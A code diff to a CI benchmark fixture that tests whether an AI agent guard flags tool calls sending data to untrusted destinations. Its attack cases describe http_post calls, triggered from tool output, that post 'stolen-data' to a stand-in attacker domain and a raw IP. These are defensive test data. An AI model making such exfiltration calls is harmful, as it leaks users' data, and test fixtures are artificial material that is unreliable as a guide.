@@ -4,13 +4,15 @@ This is the built-in fixture that gates the harness in CI. It is intentionally
 **narrow** (network-destination exfil vs trusted-destination traffic) so its
 verdicts are guaranteed and stable against the built-in objective rules: every
 attack targets a destination the ``ExternalDestinationRule`` does not trust
-(→ at least ``AUTH``), and every benign case targets a trusted host (→ ``PASS``).
-Its job is to prove the *harness* measures correctly against the real engine, not
-to be a comprehensive attack corpus — that is what the external suites are for
-(see ``tests/benchmarks/README.md``).
+(→ at least ``AUTH``): raw IP and embedded credentials in every mode, and a bare
+unknown host in strict mode because balanced mode deliberately passes it. Every
+benign case targets a trusted host (→ ``PASS``). Its job is to prove the
+*harness* measures correctly against the real engine, not to be a comprehensive
+attack corpus — that is what the external suites are for (see
+``tests/benchmarks/README.md``).
 
-One attack case carries a payload marker in ``raw_arguments`` so the redaction
-test can prove it never reaches any report.
+The ``exfil-raw-ip`` case carries a payload marker in ``raw_arguments`` only so
+the redaction test can prove it never reaches any report.
 """
 
 from __future__ import annotations
@@ -37,7 +39,7 @@ def _attack_cases() -> tuple[BenchmarkCase, ...]:
                     tool_name="http_post",
                     external_destination="exfil.attacker-domain.test",
                     source_context=SourceContext.tool_output,
-                    raw_arguments={"body": f"{PAYLOAD_MARKER} stolen-data"},
+                    mode="strict",
                 ),
             ),
         ),
@@ -51,6 +53,7 @@ def _attack_cases() -> tuple[BenchmarkCase, ...]:
                     tool_name="http_post",
                     external_destination="198.51.100.7",
                     source_context=SourceContext.tool_output,
+                    raw_arguments={"body": f"{PAYLOAD_MARKER} stolen-data"},
                 ),
             ),
         ),
